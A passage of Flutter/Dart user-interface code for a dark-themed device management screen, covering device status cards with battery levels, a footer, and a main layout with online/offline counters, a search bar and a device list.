                        boxShadow: [
                          BoxShadow(color: statusColor.withOpacity(0.4), blurRadius: 4)
                        ]
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      isActive ? "Online" : "Offline",
                      style: TextStyle(
                        color: isActive ? _successColor : Colors.white.withOpacity(0.5),
                        fontSize: 10,
                        fontWeight: FontWeight.w700,
                        fontFamily: "Rajdhani",
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Row(
                  children: [
                    Icon(Icons.battery_charging_full, color: Colors.white.withOpacity(0.3), size: 10),
                    const SizedBox(width: 4),
                    Text(
                      "${device['battery'] ?? '0'}%", 
                      style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9, fontFamily: "Rajdhani", fontWeight: FontWeight.w500)
                    ),
                  ],
                ),
              ],
            ),
            
            const SizedBox(width: 12),
            Icon(Icons.arrow_forward_ios, color: Colors.white.withOpacity(0.15), size: 12),
          ],
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return Column(
      children: [
        Container(
          height: 1,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [Colors.transparent, _glowColor1.withOpacity(0.1), Colors.transparent],
            ),
          ),
        ),
        const SizedBox(height: 12),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            _buildFooterDot(_successColor),
            const SizedBox(width: 8),
            _buildFooterText("ACTIVE"),
            const SizedBox(width: 20),
            Container(width: 1, height: 10, color: Colors.white.withOpacity(0.06)),
            const SizedBox(width: 20),
            Icon(Icons.fingerprint, color: Colors.white.withOpacity(0.12), size: 12),
            const SizedBox(width: 20),
            _buildFooterDot(_glowColor2),
            const SizedBox(width: 8),
            _buildFooterText("SECURE"),
          ],
        ),
        const SizedBox(height: 8),
        Text(
          "DEVICE MANAGEMENT",
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 8,
            letterSpacing: 3,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w600,
          ),
        ),
      ],
    );
  }

  Widget _buildFooterDot(Color color) {
    return Container(
      width: 5,
      height: 5,
      decoration: BoxDecoration(
        color: color,
        shape: BoxShape.circle,
        boxShadow: [BoxShadow(color: color, blurRadius: 5)],
      ),
    );
  }

  Widget _buildFooterText(String text) {
    return Text(
      text,
      style: TextStyle(
        color: Colors.white.withOpacity(0.25),
        fontSize: 8,
        fontWeight: FontWeight.w700,
        letterSpacing: 2.5,
        fontFamily: 'Rajdhani',
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    int totalCount = _devices.length;
    int activeCount = _devices.where((d) => _isDeviceReallyOnline(d)).length; 
    int offlineCount = totalCount - activeCount;
    final filteredList = _filteredDevices;

    return Scaffold(
      backgroundColor: _darkerBg,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: Column(
              children: [
                _buildNeonHeader(),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  child: Row(
                    children: [
                      _buildStatBox("TOTAL", totalCount.toString(), _glowColor1),
                      const SizedBox(width: 12),
                      _buildStatBox("ONLINE", activeCount.toString(), _successColor),
                      const SizedBox(width: 12),
                      _buildStatBox("OFFLINE", offlineCount.toString(), _roseColor),
                    ],
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                  child: _buildSearchBar(),
                ),
                const SizedBox(height: 8),
                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Color(0xFFDC2626), strokeWidth: 3))
                    : filteredList.isEmpty 
                      ? Center(
                          child: Text(
                            "NO DEVICES FOUND", 
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.35),
                              fontWeight: FontWeight.w800,
                              letterSpacing: 3,
                              fontFamily: "Rajdhani",
                              fontSize: 14,
                            ),
                          ),
                        )
                      : FadeTransition(
                          opacity: _fadeAnimation,
                          child: ListView.builder(
                            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                            itemCount: filteredList.length,
                            itemBuilder: (context, index) {
                              final device = filteredList[index];
                              return _buildDeviceCard(device, index);
                            },
                          ),
                        ),
                ),
                _buildFooter(),
                const SizedBox(height: 16),
              ],
            ),
          ),
        ],
      ),
    );
  }
}